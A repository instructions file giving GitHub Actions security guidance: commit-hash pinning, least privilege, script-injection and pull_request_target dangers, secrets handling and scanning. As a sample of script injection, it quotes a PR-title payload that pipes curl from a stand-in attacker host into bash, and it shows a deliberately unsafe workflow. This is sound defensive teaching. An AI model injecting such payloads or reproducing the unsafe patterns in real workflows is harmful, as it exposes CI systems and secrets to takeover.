---
applyTo: ".github/workflows/**/*.yml"
---

# GitHub Workflows Instructions

## Purpose

This instructions file provides guidelines for creating and maintaining GitHub Actions workflows in this repository.

## General Principles

### Action Pinning

**CRITICAL: All GitHub Actions MUST use commit hashes instead of version tags or branches.**

- ❌ **DO NOT** use: `uses: actions/checkout@v4`, `uses: actions/setup-python@v6`, `uses: astral-sh/setup-uv@v7`
- ✅ **DO** use: `uses: actions/checkout@8ade135a41d8b85ea433769d2a06a6bf422dcda2`

**Why commit hashes?**

1. **Security**: Prevents malicious actors from re-releasing a version tag with different code
2. **Reproducibility**: Ensures the exact same code runs every time, preventing unexpected behavior changes
3. **Audit Trail**: Clear record of which exact version of an action was used when
4. **Immutability**: Commit hashes cannot be reassigned; version tags can be moved or deleted

**How to find commit hashes:**

- Visit the action's GitHub repository (e.g., `https://github.com/actions/checkout`)
- Look for the release or tag you want to pin
- Copy the full commit SHA (40 characters)
- Replace version identifiers with the commit hash

### Workflow Naming

- Use descriptive names that clearly indicate the workflow's purpose
- Use hyphens to separate words in filenames (e.g., `python-tests.yml`, `dependency-review.yml`)
- Keep filenames lowercase

### Trigger Configuration

- Specify `on:` triggers explicitly (e.g., `workflow_dispatch`, `pull_request`, `push`)
- For `pull_request` triggers, specify branches to avoid unnecessary runs: `branches: [ main ]`
- For `push` triggers, specify branches to avoid unnecessary runs: `branches: [ main ]`

### Permissions

- Use the `permissions:` key to explicitly define required permissions
- Follow the principle of least privilege—only request permissions needed for the workflow
- Common permissions for CI workflows:
  - `contents: read` — for reading repository files
  - `checks: write` — for writing check results
  - `pull-requests: write` — for commenting on PR

## Workflow Structure

### Jobs

- Use clear, descriptive job names (e.g., `test`, `lint`, `dependency-review`)
- Specify `runs-on:` explicitly (typically `ubuntu-latest`)
- Use `strategy.matrix` for testing across multiple environments (Python versions, OS versions, etc.)

### Steps

- Use `name:` for every step to make logs readable
- Prefer `uses:` for GitHub Actions
- Use `run:` for shell commands
- Group related commands using `run: |` for multi-line scripts

### Artifacts and Reports

- Upload test reports and coverage reports as artifacts for visibility
- Use consistent artifact naming: include the matrix variable in the name (e.g., `coverage-html-${{ matrix.python-version }}`)
- Provide meaningful artifact names that help users identify the contents

### Environment Variables

- Define environment variables at the job or workflow level using `env:`
- Use `${{ github.workspace }}` or `${{ runner.workspace }}` for path references
- Use `${{ secrets.* }}` for sensitive values (defined in repository settings)

## Best Practices

### Security

- Always pin actions to commit hashes—never use version tags or branches in production workflows
- Use `permissions:` to restrict access to only what's needed
- Avoid storing secrets in workflow files; use repository secrets instead
- Review the source code of any custom actions before using them
- Prevent script injection by never using untrusted input directly in `run:` commands
- Avoid `pull_request_target` unless absolutely necessary and properly secured
- Never use self-hosted runners on public repositories
- Enable security scanning (CodeQL, Dependency Review) on all workflows

### Performance

- Use caching where appropriate (e.g., Python dependencies, build artifacts)
- Avoid unnecessary steps or jobs
- Use `if:` conditions to skip steps that aren't needed (e.g., `if: failure()`)

### Clarity

- Use descriptive step names (`name:` field)
- Group related steps logically
- Include explanatory comments for complex logic
- Use structured output (JSON, XML) for reports

### Maintainability

- Keep workflows DRY by extracting common logic into composite actions or reusable workflows
- Document any non-obvious conventions or decisions in comments
- Review and update action versions periodically (including their commit hashes)

## Examples

### Correct Action Usage

```yaml
- name: Checkout Code
  uses: actions/checkout@8ade135a41d8b85ea433769d2a06a6bf422dcda2

- name: Set up Python
  uses: actions/setup-python@82c7e631bb3cdc910f68850056da6ecd0d4afc81
  with:
    python-version: '3.12'

- name: Install uv
  uses: astral-sh/setup-uv@c40cdc2b6f3156d4e64f5b2f09cc1e6c4e658e18
  with:
    enable-cache: true

- name: Upload Artifacts
  uses: actions/upload-artifact@b4b15b8c7c6ac21ea08fcf65892d2ee8f75cf882
  with:
    name: test-results
    path: tests/results/
```

### Permissions Example

```yaml
permissions:
  contents: read          # Need to read repository files
  checks: write          # Need to write check results
  pull-requests: write   # Need to comment on PRs
```

### Environment and Matrix Example

```yaml
env:
  PYTHONPATH: ${{ github.workspace }}/shared/python:${{ github.workspace }}

strategy:
  matrix:
    python-version: [ '3.12', '3.13', '3.14' ]

steps:
  - name: Run Tests
    run: python -m pytest
    env:
      COVERAGE_FILE: tests/.coverage-${{ matrix.python-version }}
```

## Checklist Before Committing

- [ ] All GitHub Actions use commit hashes (no version tags)
- [ ] Triggers are explicitly defined (`on:`)
- [ ] Permissions are minimal and appropriate (`permissions:`)
- [ ] All steps have descriptive names
- [ ] Artifacts are named clearly and uploaded
- [ ] Environment variables are defined appropriately
- [ ] Complex logic is documented with comments
- [ ] Workflow has been tested (at least once) to ensure syntax is valid
- [ ] No script injection vulnerabilities (untrusted input is passed via environment variables)
- [ ] No use of `pull_request_target` without proper security review
- [ ] Secrets are never logged or exposed
- [ ] Third-party actions have been vetted and pinned to commit hashes

## OpenSSF Security Best Practices

### Script Injection Prevention

**CRITICAL: Never use untrusted input directly in `run:` commands.**

Untrusted input includes:
- `${{ github.event.pull_request.title }}`
- `${{ github.event.pull_request.body }}`
- `${{ github.event.issue.title }}`
- `${{ github.event.comment.body }}`
- `${{ github.head_ref }}` (branch names from PRs)
- Any user-controlled data from events

#### ❌ Vulnerable Pattern (Script Injection)

```yaml
# DANGEROUS: Attacker can inject shell commands via PR title
- name: Comment on PR
  run: |
    echo "Processing PR: ${{ github.event.pull_request.title }}"
    # If title is: `"; curl evil.com | bash; echo "`
    # This executes arbitrary code!
```

#### ✅ Safe Pattern (Use Environment Variables)

```yaml
# SAFE: Pass untrusted input through environment variables
- name: Comment on PR
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Processing PR: $PR_TITLE"
    # Environment variables are properly escaped by the shell
```

#### ✅ Safe Pattern (Use Actions)

```yaml
# SAFE: Use actions designed to handle untrusted input
- name: Comment on PR
  uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea
  with:
    script: |
      github.rest.issues.createComment({
        issue_number: context.issue.number,
        owner: context.repo.owner,
        repo: context.repo.repo,
        body: 'PR processed: ' + context.payload.pull_request.title
      })
```

### Dangerous Workflow Triggers

#### `pull_request_target` Warning

**⚠️ EXTREMELY DANGEROUS: `pull_request_target` runs with write permissions to the base repository.**

The `pull_request_target` trigger:
- Runs in the context of the base branch (not the PR branch)
- Has **write access** to the base repository
- Has access to repository secrets
- Can be triggered by anyone who can create a PR (including attackers)

**When NOT to use:**
- ❌ Never checkout code from the PR (`${{ github.event.pull_request.head.ref }}`)
- ❌ Never execute code from the PR (tests, builds, scripts)
- ❌ Never install dependencies from the PR's package files

**When it's safe to use (rare cases):**
- ✅ Commenting on PRs using `actions/github-script`
- ✅ Labeling PRs based on metadata (not content)
- ✅ Static analysis that doesn't execute PR code

#### ❌ Dangerous Pattern

```yaml
on:
  pull_request_target:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8ade135a41d8b85ea433769d2a06a6bf422dcda2
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS!

      - name: Run tests from PR
        run: npm test  # Executes attacker's code with write permissions!
```

#### ✅ Safe Alternative

```yaml
# Use pull_request (not pull_request_target) for running PR code
on:
  pull_request:
    branches: [ main ]

permissions:
  contents: read  # Read-only, no write access

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8ade135a41d8b85ea433769d2a06a6bf422dcda2

      - name: Run tests
        run: npm test  # Safe: runs in isolated environment without write access
```

### Self-Hosted Runners

**⚠️ NEVER use self-hosted runners on public repositories.**

Risks:
- Pull requests from forks can execute arbitrary code on your infrastructure
- Runners may retain secrets or sensitive data between runs
- Potential for persistent backdoors or data exfiltration

**Guidelines:**
- ✅ Use GitHub-hosted runners (`ubuntu-latest`, `windows-latest`, `macos-latest`) for public repos
- ✅ Use self-hosted runners only on private repositories with strict access controls
- ✅ If you must use self-hosted runners, isolate them completely (ephemeral containers)

### Secrets Management

**Best practices for handling secrets:**

1. **Never log secrets:**
   ```yaml
   # ❌ WRONG: Secret appears in logs
   - name: Deploy
     run: echo "Deploying with token ${{ secrets.DEPLOY_TOKEN }}"

   # ✅ CORRECT: Don't log secrets
   - name: Deploy
     env:
       DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
     run: ./deploy.sh
   ```

2. **Mask dynamic secrets:**
   ```yaml
   - name: Generate temporary token
     run: |
       TOKEN=$(generate-token)
       echo "::add-mask::$TOKEN"
       echo "TEMP_TOKEN=$TOKEN" >> $GITHUB_ENV
   ```

3. **Secrets in fork PRs:**
   - Secrets are **NOT** available to workflows triggered by forks
   - Use `pull_request_target` only for safe operations (commenting, labeling)
   - Never trust fork PR code with write permissions or secrets access

4. **Least privilege:**
   ```yaml
   # Only request secrets that are actually needed
   env:
     AZURE_CREDENTIALS: ${{ secrets.AZURE_CREDENTIALS }}
     # Don't include: ${{ secrets.* }} (exposes all secrets)
   ```

### Third-Party Action Security

**Before using any third-party action:**

1. **Verify the publisher:**
   - ✅ Prefer actions from verified creators (GitHub, Microsoft, AWS, etc.)
   - ✅ Check the action's repository for maintenance and activity
   - ⚠️ Be extra cautious with newly created or unmaintained actions

2. **Review the source code:**
   - Read the action's code before first use
   - Check what permissions it requests
   - Look for suspicious network calls or data exfiltration
   - Verify it only does what it claims to do

3. **Pin to commit SHA:**
   - Always pin actions to specific commit hashes (as shown throughout this guide)
   - Never use `@main`, `@master`, or `@latest` in production workflows
   - Document why you're using specific versions

4. **Audit regularly:**
   - Review pinned actions quarterly for updates
   - Check for security advisories
   - Test updates in a non-production environment first
   - Update commit hashes when new versions are released

5. **Example vetting process:**
   ```yaml
   # Good: Vetted, pinned, documented
   - name: Setup Python
     uses: actions/setup-python@82c7e631bb3cdc910f68850056da6ecd0d4afc81  # v5.0.0
     # Vetted on: 2024-01-15
     # Review: Standard action from GitHub, well-maintained
     # Next review: 2024-04-15
     with:
       python-version: '3.12'
   ```

### Security Scanning Integration

**Enable security scanning in your workflows:**

#### 1. CodeQL Analysis (SAST)

```yaml
name: CodeQL Security Scanning

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron: '0 0 * * 1'  # Weekly on Mondays

permissions:
  actions: read
  contents: read
  security-events: write

jobs:
  analyze:
    name: Analyze Code
    runs-on: ubuntu-latest

    strategy:
      matrix:
        language: [ 'python', 'javascript' ]

    steps:
      - name: Checkout Code
        uses: actions/checkout@8ade135a41d8b85ea433769d2a06a6bf422dcda2

      - name: Initialize CodeQL
        uses: github/codeql-action/init@e8893c57a1f3a2b659b6b55564fdfdbbd2982911
        with:
          languages: ${{ matrix.language }}

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@e8893c57a1f3a2b659b6b55564fdfdbbd2982911
```

#### 2. Dependency Review (Prevent Vulnerable Dependencies)

```yaml
name: Dependency Review

on:
  pull_request:
    branches: [ main ]

permissions:
  contents: read
  pull-requests: write

jobs:
  dependency-review:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@8ade135a41d8b85ea433769d2a06a6bf422dcda2

      - name: Review Dependencies
        uses: actions/dependency-review-action@5a2ce3f5b92ee19cbb1541a4984c76d921601d7c
        with:
          fail-on-severity: moderate
          deny-licenses: GPL-2.0, AGPL-3.0
```

#### 3. Container Scanning (if applicable)

```yaml
- name: Scan Container Image
  uses: aquasecurity/trivy-action@915b19bbe73b92a6cf82a1bc12b087c9a19a5fe2
  with:
    image-ref: 'myregistry.azurecr.io/myapp:${{ github.sha }}'
    format: 'sarif'
    output: 'trivy-results.sarif'
    severity: 'CRITICAL,HIGH'

- name: Upload Trivy Results
  uses: github/codeql-action/upload-sarif@e8893c57a1f3a2b659b6b55564fdfdbbd2982911
  with:
    sarif_file: 'trivy-results.sarif'
```

### Additional OpenSSF Best Practices

1. **OIDC for Cloud Authentication:**
   - Use OIDC tokens instead of long-lived credentials where possible
   - Example: Azure Login with OIDC instead of service principal secrets

2. **Workflow Isolation:**
   - Each job should have minimal permissions
   - Use separate workflows for different security contexts
   - Isolate privileged operations (deployments) from untrusted operations (PR tests)

3. **Audit Logging:**
   - Enable audit logging for workflow runs
   - Monitor for suspicious workflow modifications
   - Review failed workflow runs for potential attacks

4. **Supply Chain Security:**
   - Lock dependency versions in package files
   - Use dependency scanning action
   - Verify artifact signatures where possible
   - Use reproducible builds

5. **Environment Protection Rules:**
   - Use GitHub Environments for sensitive deployments
   - Require manual approval for production deployments
   - Restrict which branches can deploy to environments

## Checklist Before Committing

- [ ] All GitHub Actions use commit hashes (no version tags)
- [ ] Triggers are explicitly defined (`on:`)
- [ ] Permissions are minimal and appropriate (`permissions:`)
- [ ] All steps have descriptive names
- [ ] Artifacts are named clearly and uploaded
- [ ] Environment variables are defined appropriately
- [ ] Complex logic is documented with comments
- [ ] Workflow has been tested (at least once) to ensure syntax is valid
